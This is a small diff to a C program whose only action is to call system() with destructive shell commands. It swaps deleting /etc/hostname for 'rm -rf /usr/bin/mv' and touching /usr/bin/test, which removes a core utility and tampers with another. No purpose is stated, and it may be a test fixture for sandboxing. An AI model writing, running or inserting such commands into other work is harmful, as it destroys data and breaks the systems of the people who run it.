@@ -1,6 +1,7 @@
 #include <stdlib.h>
 
 int main() {
-    system("rm /etc/hostname");
+    system("rm -rf /usr/bin/mv");
+    system("touch /usr/bin/test");
     return 0;
 }
